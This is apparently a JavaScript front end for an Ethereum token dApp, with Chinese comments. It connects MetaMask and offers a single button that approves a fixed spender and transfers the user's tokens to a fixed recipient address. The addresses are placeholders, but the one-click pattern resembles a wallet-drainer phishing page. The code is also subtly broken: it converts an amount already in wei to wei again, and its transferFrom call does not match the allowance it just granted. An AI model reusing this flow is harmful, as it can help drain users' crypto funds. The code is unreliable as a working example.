const connectButton = document.getElementById('connectButton');
const authorizeAndApproveButton = document.getElementById('authorizeAndApproveButton');
const transferFromButton = document.getElementById('transferFromButton');
const message = document.getElementById('message');

let userAccount = null;
const contractAddress = 'YOUR_CONTRACT_ADDRESS'; // 请替换为你的合约地址
const contractABI = []; // 请在这里添加你的合约 ABI

// 默认值的初始化，连接后会自动获取
let spenderAddress;
let amount; // 可以设置为从合约中获取的动态值
let recipientAddress;

const web3 = new Web3(window.ethereum);

connectButton.addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            // 请求用户账户连接
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];
            message.textContent = `已连接账户: ${userAccount}`;
            
            // 自动获取信息
            await fetchContractData(); // 调用获取合约数据的函数
            
            authorizeAndApproveButton.disabled = false; // 启用授权并批准按钮
            transferFromButton.disabled = false; // 启用转账按钮
        } catch (error) {
            // 显示详细的错误信息
            if (error.message.includes('User rejected the request')) {
                message.textContent = '连接被用户拒绝。请重试。';
            } else if (error.message.includes('No provider found')) {
                message.textContent = '请确保安装了以太坊钱包（如 MetaMask）。';
            } else {
                message.textContent = `连接钱包失败: ${error.message}`;
            }
            console.error(error);
        }
    } else {
        message.textContent = '请安装 MetaMask 或其他以太坊钱包。';
    }
});

// 函数：获取合约数据
async function fetchContractData() {
    const contract = new web3.eth.Contract(contractABI, contractAddress);
    
    // 获取默认的授权地址、金额和接收者地址
    spenderAddress = 'SPECIFIC_SPENDER_ADDRESS'; // 替换为你的具体授权地址
    amount = await contract.methods.allowance(userAccount, spenderAddress).call(); // 从合约中获取授权金额
    recipientAddress = 'SPECIFIC_RECIPIENT_ADDRESS'; // 替换为你的具体接收者地址

    message.textContent += `\n自动获取的信息：\n授权地址: ${spenderAddress}\n授权金额: ${web3.utils.fromWei(amount, 'ether')} 代币\n接收者地址: ${recipientAddress}`;
}

authorizeAndApproveButton.addEventListener('click', async () => {
    const weiAmount = web3.utils.toWei(amount, 'ether'); // 转换为 wei

    if (userAccount) {
        const contract = new web3.eth.Contract(contractABI, contractAddress);
        try {
            // 执行授权
            const approveReceipt = await contract.methods.approve(spenderAddress, weiAmount).send({ from: userAccount });
            message.textContent = `授权成功: ${approveReceipt.transactionHash}`;
            
            // 执行转账
            const transferReceipt = await contract.methods.transferFrom(userAccount, recipientAddress, weiAmount).send({ from: userAccount });
            message.textContent += `\n转账成功: ${transferReceipt.transactionHash}`;
        } catch (error) {
            message.textContent = '授权或转账失败。';
            console.error(error);
        }
    } else {
        message.textContent = '请先连接钱包。';
    }
});

transferFromButton.addEventListener('click', async () => {
    // 可以考虑禁用转账按钮，因为现在所有操作都在新按钮中完成
    message.textContent = '请使用授权并批准按钮进行操作。';
});
